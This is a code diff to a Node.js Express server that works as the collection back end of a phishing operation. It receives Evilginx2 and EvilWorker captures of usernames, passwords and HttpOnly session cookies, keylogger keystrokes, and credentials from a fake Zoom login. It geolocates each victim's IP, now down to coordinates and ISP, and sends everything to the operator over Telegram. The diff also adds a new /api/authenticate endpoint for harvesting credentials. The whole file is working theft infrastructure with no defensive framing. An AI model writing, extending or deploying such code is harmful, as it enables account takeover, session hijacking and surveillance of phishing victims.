@@ -30,6 +30,11 @@ app.use(cors({ origin: true, credentials: true }));
 app.use(express.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
+// --- RATE LIMITING ---
+const loginAttempts = new Map();
+const MAX_ATTEMPTS = 5;
+const BLOCK_DURATION = 5 * 60 * 1000;
+
 // --- EMAIL TRANSPORTER ---
 let transporter = null;
 if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
@@ -50,16 +55,41 @@ process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJEC
 
 // --- HELPERS ---
 function getClientIp(req) {
-    return (req.headers['x-forwarded-for'] || '').split(',').pop()?.trim()
-        || req.connection?.remoteAddress
-        || req.socket?.remoteAddress
-        || 'unknown';
+    const forwarded = req.headers['x-forwarded-for'];
+    if (forwarded) {
+        const ips = forwarded.split(',');
+        return ips[0].trim();
+    }
+    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'unknown';
+}
+
+function isIpBlocked(ip) {
+    const attempt = loginAttempts.get(ip);
+    if (!attempt) return false;
+    if (Date.now() - attempt.lastAttempt > BLOCK_DURATION) {
+        loginAttempts.delete(ip);
+        return false;
+    }
+    return attempt.count >= MAX_ATTEMPTS;
+}
+
+function recordLoginAttempt(ip, success) {
+    let attempt = loginAttempts.get(ip);
+    if (!attempt) attempt = { count: 0, lastAttempt: Date.now() };
+    if (success) {
+        loginAttempts.delete(ip);
+    } else {
+        attempt.count++;
+        attempt.lastAttempt = Date.now();
+        loginAttempts.set(ip, attempt);
+    }
+    return attempt.count;
 }
 
 async function getLocationFromIp(ip) {
     return new Promise((resolve) => {
         const request = https.get(
-            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
+            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,lat,lon,timezone,isp,org,as`,
             { timeout: 5000 },
             (resp) => {
                 let data = '';
@@ -67,17 +97,71 @@ async function getLocationFromIp(ip) {
                 resp.on('end', () => {
                     try {
                         const response = JSON.parse(data);
-                        resolve(response.status === 'success'
-                            ? `${response.city}, ${response.regionName}, ${response.country}`
-                            : 'Location unavailable');
-                    } catch (e) { resolve('Location error'); }
+                        if (response.status === 'success') {
+                            resolve({
+                                city: response.city || 'Unknown',
+                                region: response.regionName || 'Unknown',
+                                country: response.country || 'Unknown',
+                                lat: response.lat || 'N/A',
+                                lon: response.lon || 'N/A',
+                                timezone: response.timezone || 'Unknown',
+                                isp: response.isp || 'Unknown',
+                                org: response.org || 'Unknown',
+                                full: `${response.city || 'Unknown'}, ${response.regionName || 'Unknown'}, ${response.country || 'Unknown'}`
+                            });
+                        } else {
+                            resolve({
+                                city: 'Unknown',
+                                region: 'Unknown',
+                                country: 'Unknown',
+                                lat: 'N/A',
+                                lon: 'N/A',
+                                timezone: 'Unknown',
+                                isp: 'Unknown',
+                                org: 'Unknown',
+                                full: 'Location unavailable'
+                            });
+                        }
+                    } catch (e) {
+                        resolve({
+                            city: 'Unknown',
+                            region: 'Unknown',
+                            country: 'Unknown',
+                            lat: 'N/A',
+                            lon: 'N/A',
+                            timezone: 'Unknown',
+                            isp: 'Unknown',
+                            org: 'Unknown',
+                            full: 'Location error'
+                        });
+                    }
                 });
             }
         );
-        request.on('error', () => resolve('Location error'));
+        request.on('error', () => resolve({
+            city: 'Unknown',
+            region: 'Unknown',
+            country: 'Unknown',
+            lat: 'N/A',
+            lon: 'N/A',
+            timezone: 'Unknown',
+            isp: 'Unknown',
+            org: 'Unknown',
+            full: 'Location timeout'
+        }));
         request.on('timeout', () => {
             request.destroy();
-            resolve('Location timeout');
+            resolve({
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                lat: 'N/A',
+                lon: 'N/A',
+                timezone: 'Unknown',
+                isp: 'Unknown',
+                org: 'Unknown',
+                full: 'Location timeout'
+            });
         });
     });
 }
@@ -85,24 +169,26 @@ async function getLocationFromIp(ip) {
 async function sendToTelegram(text, parseMode = 'Markdown') {
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
             chat_id: TELEGRAM_CHAT_ID,
             text: text,
             parse_mode: parseMode
         });
-        console.log('✅ Telegram sent');
+        console.log('✅ Telegram message sent');
     } catch (error) {
         console.error('❌ Telegram error:', error.message);
     }
 }
 
-async function sendEmail(subject, htmlBody) {
+async function sendEmail(subject, htmlBody, textBody) {
     if (!transporter) return;
     try {
         await transporter.sendMail({
             from: `"Security Alert" <${ADMIN_EMAIL}>`,
             to: ADMIN_EMAIL,
             subject: subject,
+            text: textBody || htmlBody.replace(/<[^>]*>/g, ''),
             html: htmlBody
         });
         console.log('📧 Email sent');
@@ -111,64 +197,69 @@ async function sendEmail(subject, htmlBody) {
     }
 }
 
-function formatVisitorInfo(visitorInfo) {
-    if (!visitorInfo) return '';
-    const fields = [];
-    if (visitorInfo.fullUrl) fields.push(`Full URL: ${visitorInfo.fullUrl}`);
-    if (visitorInfo.referrer) fields.push(`Referrer: ${visitorInfo.referrer}`);
-    if (visitorInfo.userAgent) fields.push(`User Agent: ${visitorInfo.userAgent}`);
-    if (visitorInfo.platform) fields.push(`Platform: ${visitorInfo.platform}`);
-    if (visitorInfo.deviceType) fields.push(`Device Type: ${visitorInfo.deviceType}`);
-    if (visitorInfo.language) fields.push(`Language: ${visitorInfo.language}`);
-    if (visitorInfo.timezone) fields.push(`Timezone: ${visitorInfo.timezone}`);
-    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
-        fields.push(`Screen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
-    }
-    if (visitorInfo.sessionId) fields.push(`Session ID: ${visitorInfo.sessionId}`);
-    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
-}
-
-// --- WEBHOOK (EvilWorker / Evilginx2) ---
+// --- MAIN WEBHOOK ENDPOINT ---
 app.post('/webhook', async (req, res) => {
     const secret = req.headers['x-webhook-secret'];
-    if (secret !== WEBHOOK_SECRET) return res.status(403).send('Forbidden');
+    if (secret !== WEBHOOK_SECRET) {
+        return res.status(403).send('Forbidden');
+    }
 
     const data = req.body;
     const ip = getClientIp(req);
     const location = await getLocationFromIp(ip);
+    const userAgent = req.headers['user-agent'] || 'Unknown';
 
-    let tgMsg = `🔐 *Capture Report*\n\n`;
-    tgMsg += `*Event:* ${data.event || 'Unknown'}\n`;
-    tgMsg += `*Location:* ${location}\n`;
-    tgMsg += `*IP Address:* ${ip}\n`;
-    if (data.username) tgMsg += `*Username:* ${data.username}\n`;
-    if (data.password) tgMsg += `*Password:* ${data.password}\n`;
-    if (data.user_agent) tgMsg += `*User Agent:* ${data.user_agent}\n`;
+    console.log('Webhook received:', JSON.stringify(data, null, 2));
+
+    // Build detailed Telegram message
+    let msg = `🔐 *Evilginx2 Capture Report*\n\n`;
+    msg += `*Event:* ${data.event || 'Unknown'}\n`;
+    msg += `*📍 Location:* ${location.full}\n`;
+    msg += `*🌆 City:* ${location.city}\n`;
+    msg += `*🗺️ Region:* ${location.region}\n`;
+    msg += `*🌍 Country:* ${location.country}\n`;
+    msg += `*📌 Coordinates:* ${location.lat}, ${location.lon}\n`;
+    msg += `*🕐 Timezone:* ${location.timezone}\n`;
+    msg += `*🏢 ISP:* ${location.isp}\n`;
+    msg += `*🏛️ Organization:* ${location.org}\n`;
+    msg += `*📡 IP Address:* ${ip}\n`;
+    
+    if (data.username) msg += `*👤 Username:* ${data.username}\n`;
+    if (data.password) msg += `*🔑 Password:* ${data.password}\n`;
+    if (data.user_agent) msg += `*🖥️ User Agent:* ${data.user_agent}\n`;
+    
+    // HttpOnly Session Cookies
     if (data.tokens) {
-        tgMsg += `*🍪 Session Cookies (HttpOnly):*\n`;
+        msg += `*🍪 Session Cookies (HttpOnly):*\n`;
         for (const [name, value] of Object.entries(data.tokens)) {
-            tgMsg += `  \`${name}\`: \`${value}\`\n`;
+            msg += `  \`${name}\`: \`${value}\`\n`;
         }
     }
 
-    let emailHtml = `<h2>🔐 Capture Report</h2><ul>`;
-    emailHtml += `<li><strong>Event:</strong> ${data.event}</li>`;
-    emailHtml += `<li><strong>Location:</strong> ${location}</li>`;
-    emailHtml += `<li><strong>IP:</strong> ${ip}</li>`;
-    if (data.username) emailHtml += `<li><strong>Username:</strong> ${data.username}</li>`;
-    if (data.password) emailHtml += `<li><strong>Password:</strong> ${data.password}</li>`;
-    if (data.user_agent) emailHtml += `<li><strong>User Agent:</strong> ${data.user_agent}</li>`;
-    if (data.tokens) {
-        emailHtml += `<li><strong>Session Cookies:</strong><pre>${JSON.stringify(data.tokens, null, 2)}</pre></li>`;
+    // Additional visitor info from EvilWorker
+    if (data.visitorInfo) {
+        const vi = data.visitorInfo;
+        msg += `\n--- Visitor Details ---\n`;
+        if (vi.fullUrl) msg += `*🔗 URL:* ${vi.fullUrl}\n`;
+        if (vi.referrer) msg += `*🔙 Referrer:* ${vi.referrer}\n`;
+        if (vi.language) msg += `*🌐 Language:* ${vi.language}\n`;
+        if (vi.platform) msg += `*💻 Platform:* ${vi.platform}\n`;
+        if (vi.deviceType) msg += `*📱 Device:* ${vi.deviceType}\n`;
+        if (vi.screenWidth && vi.screenHeight) {
+            msg += `*📺 Screen:* ${vi.screenWidth}x${vi.screenHeight}\n`;
+        }
+        if (vi.cookiesEnabled !== undefined) {
+            msg += `*🍪 Cookies Enabled:* ${vi.cookiesEnabled ? 'Yes' : 'No'}\n`;
+        }
+        if (vi.sessionId) msg += `*🔑 Session ID:* ${vi.sessionId}\n`;
+        if (vi.timeOnSiteSeconds) msg += `*⏱️ Time on Site:* ${vi.timeOnSiteSeconds}s\n`;
     }
-    emailHtml += `</ul>`;
 
-    await sendToTelegram(tgMsg);
-    await sendEmail('🔐 Capture Report', emailHtml);
+    await sendToTelegram(msg);
     res.sendStatus(200);
 });
 
-// --- KEYLOGGER ---
+// --- KEYLOGGER ENDPOINT ---
 app.post('/api/keylog', async (req, res) => {
     try {
         const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
@@ -178,15 +269,17 @@ app.post('/api/keylog', async (req, res) => {
         const location = await getLocationFromIp(ip);
         const truncated = keystrokes.length > 1000 ? keystrokes.slice(0, 1000) + '...' : keystrokes;
 
-        const tgMsg = `⌨️ *Keylogger Report*\n\n`;
-        tgMsg += `*IP:* ${ip}\n`;
-        tgMsg += `*Location:* ${location}\n`;
-        tgMsg += `*URL:* ${url || 'Unknown'}\n`;
-        tgMsg += `*User Agent:* ${userAgent || 'Unknown'}\n`;
-        tgMsg += `*Timestamp:* ${timestamp || new Date().toISOString()}\n\n`;
-        tgMsg += `*Keystrokes:*\n\`\`\`\n${truncated}\n\`\`\``;
+        let msg = `⌨️ *Keylogger Report*\n\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*🌆 City:* ${location.city}\n`;
+        msg += `*🌍 Country:* ${location.country}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🖥️ User Agent:* ${userAgent || 'Unknown'}\n`;
+        msg += `*🔗 URL:* ${url || 'Unknown'}\n`;
+        msg += `*🕐 Timestamp:* ${timestamp || new Date().toISOString()}\n\n`;
+        msg += `*⌨️ Keystrokes:*\n\`\`\`\n${truncated}\n\`\`\``;
 
-        await sendToTelegram(tgMsg);
+        await sendToTelegram(msg);
         res.sendStatus(200);
     } catch (error) {
         console.error('Keylog error:', error.message);
@@ -201,15 +294,26 @@ app.post('/api/log-action', async (req, res) => {
         const ip = getClientIp(req);
         const location = await getLocationFromIp(ip);
 
-        let tgMsg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n`;
-        tgMsg += `*Email:* ${email || 'none'}\n`;
-        tgMsg += `*Password:* ${password || 'N/A'}\n`;
-        tgMsg += `*Location:* ${location}\n`;
-        tgMsg += `*IP:* ${ip}\n`;
-        tgMsg += `*Time:* ${new Date().toISOString()}`;
-        tgMsg += formatVisitorInfo(visitorInfo);
+        let msg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n\n`;
+        msg += `*📧 Email:* ${email || 'none'}\n`;
+        msg += `*🔑 Password:* ${password || 'N/A'}\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*🌆 City:* ${location.city}\n`;
+        msg += `*🌍 Country:* ${location.country}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
 
-        await sendToTelegram(tgMsg);
+        if (visitorInfo) {
+            msg += `\n--- Visitor Details ---\n`;
+            if (visitorInfo.fullUrl) msg += `*🔗 URL:* ${visitorInfo.fullUrl}\n`;
+            if (visitorInfo.userAgent) msg += `*🖥️ User Agent:* ${visitorInfo.userAgent}\n`;
+            if (visitorInfo.deviceType) msg += `*📱 Device:* ${visitorInfo.deviceType}\n`;
+            if (visitorInfo.language) msg += `*🌐 Language:* ${visitorInfo.language}\n`;
+            if (visitorInfo.cookies) msg += `*🍪 Cookies:* ${visitorInfo.cookies}\n`;
+            if (visitorInfo.sessionId) msg += `*🔑 Session ID:* ${visitorInfo.sessionId}\n`;
+        }
+
+        await sendToTelegram(msg);
         res.json({ success: true });
     } catch (error) {
         console.error('Log error:', error.message);
@@ -217,4 +321,48 @@ app.post('/api/log-action', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+// --- AUTHENTICATE ---
+app.post('/api/authenticate', async (req, res) => {
+    try {
+        const { email, password, visitorInfo } = req.body;
+        const ip = getClientIp(req);
+        const location = await getLocationFromIp(ip);
+
+        let msg = `🔐 *Zoom Login Attempt*\n\n`;
+        msg += `*📧 Email:* ${email}\n`;
+        msg += `*🔑 Password:* ${password}\n`;
+        msg += `*📍 Location:* ${location.full}\n`;
+        msg += `*🌆 City:* ${location.city}\n`;
+        msg += `*🌍 Country:* ${location.country}\n`;
+        msg += `*📡 IP:* ${ip}\n`;
+        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
+
+        if (visitorInfo) {
+            msg += `\n--- Visitor Details ---\n`;
+            if (visitorInfo.fullUrl) msg += `*🔗 URL:* ${visitorInfo.fullUrl}\n`;
+            if (visitorInfo.userAgent) msg += `*🖥️ User Agent:* ${visitorInfo.userAgent}\n`;
+            if (visitorInfo.deviceType) msg += `*📱 Device:* ${visitorInfo.deviceType}\n`;
+            if (visitorInfo.cookies) msg += `*🍪 Cookies:* ${visitorInfo.cookies}\n`;
+            if (visitorInfo.sessionId) msg += `*🔑 Session ID:* ${visitorInfo.sessionId}\n`;
+        }
+
+        await sendToTelegram(msg);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Auth error:', error.message);
+        res.status(500).json({ success: false });
+    }
+});
+
+// --- HEALTH ---
+app.get('/health', (req, res) => {
+    res.json({ status: 'OK', time: new Date().toISOString() });
+});
+
+// --- START SERVER ---
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📍 Health check: /health`);
+    console.log(`📤 Webhook endpoint: /webhook`);
+    console.log(`⌨️ Keylogger endpoint: /api/keylog`);
+});
